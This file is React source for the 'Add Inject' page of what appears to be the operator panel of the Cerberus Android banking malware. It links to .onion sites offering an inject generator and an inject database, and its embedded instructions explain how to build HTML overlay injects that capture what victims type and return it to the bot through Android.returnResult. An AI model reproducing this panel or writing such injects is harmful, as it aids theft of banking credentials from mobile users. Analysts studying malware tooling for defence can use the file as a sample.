import React from 'react';
import InjectTable from '../Controls/InjectsTable/InjectTable';
import SettingsContext from '../Settings';
import AddInjectForm from '../Controls/InjectsTable/AddInjectForm';

class AddInject extends React.Component {
    constructor(props) {
        super(props)
        this.InjListForceUpdate = this.InjListForceUpdate.bind(this)
    }

    InjListForceUpdate() {
        this.forceUpdate();
    }

    render () {
        return (
        <React.Fragment>
            <div class="row">
                <div class="col">
                    <div class="row">
                        <div class="col">
                            <h1 class="pageHeader disable-select">Inject list</h1>
                        </div>
                        <div class="col">
                            <a type="button" style={({float:'right'})} href="http://oi5dkmd2hcv6rmkk.onion/" target="_blank" class="btn btn-outline-info">Simple Inject Generator</a>
                            <a type="button" style={({float:'right',marginRight:'15px'})} href="http://oi5dkmd2hcv6rmkk.onion/injects/" target="_blank" class="btn btn-outline-warning">Cerberus inject database</a>
                        </div>
                    </div>
                    <InjectTable InjListForceUpdate={this.InjListForceUpdate} hash={SettingsContext.UpdateInjectsHash} />
                </div>
                <div class="col col-lg-4">
                    <h1 class="pageHeader disable-select">Add new Inject</h1>
                    <AddInjectForm InjListForceUpdate={this.InjListForceUpdate} />
                    <br /><br /><br />
                    <div class="accordion" id="accordionInstruction">
                        <div class="card">
                            <div class="card-header" id="headingInstruction">
                                <h2 class="mb-0">
                                    <button style={({fontSize:'1.3rem'})} class="btn btn-link" type="button" data-toggle="collapse" data-target="#collapseInstruction" aria-expanded="true" aria-controls="collapseInstruction">
                                        Instructions for creating injects for Malware Cerberus.
                                    </button>
                                </h2>
                            </div>

                            <div id="collapseInstruction" class="collapse" aria-labelledby="headingInstruction" data-parent="#accordionInstruction">
                                <div class="card-body">
                                    Cerberus injects are an HTML file that contains css and JS code. <br />
                                    Injects are downloaded to the device, and work locally, without access to the Internet, so there is NO downloads of anything (images or scripts) from the Internet! Enter everything in the html file, and more specifically: scripts as plain text, and insert images into base64. <br />
                                    <br />
                                    To send inject information about the entered data, use the Android.returnResult function, which accepts valid JSON. <br />
                                    In the examples of our injects there are examples of using this function. If you want to complete the work of the injection after it has been executed, then you must send the "exit":"" parameter to JSON, since it shows the bot that everything is injected into the injection, and you do not need to re-show it. <br />
                                    <br />
                                    If there will be additional questions, please write to support. <br />
                                    Examples of injects provide. 
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </React.Fragment>
        );
    }
}

export default AddInject;